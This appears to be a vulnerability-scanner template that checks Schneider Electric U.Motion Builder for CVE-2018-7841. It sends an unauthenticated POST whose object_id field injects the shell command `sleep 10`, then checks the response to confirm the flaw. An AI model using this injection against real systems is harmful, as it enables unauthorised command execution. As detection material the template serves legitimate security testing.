[info]
author = "AVE"
description = "通过向 track_import_export.php 的 object_id 参数注入系统命令，验证施耐德电气 U.Motion Builder 1.3.4 的未认证远程命令执行漏洞。攻击者无需认证即可利用 exec() 调用执行任意 OS 命令。"
id = "POC-AVE-2018-1006"
name = "Schneider Electric U.Motion Builder 命令注入 PoC"
severity = "critical"
tags = ["ave-2018-1006"]
vuln_id = [
    "CVE-2018-7841",
    "AVE-2018-1006",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/modules/reporting/track_import_export.php"
protocol = "http"

[poc.requests.body]
content = "op=export&language=english&interval=1&object_id=`sleep 10`"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = ["application/octet-stream"]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
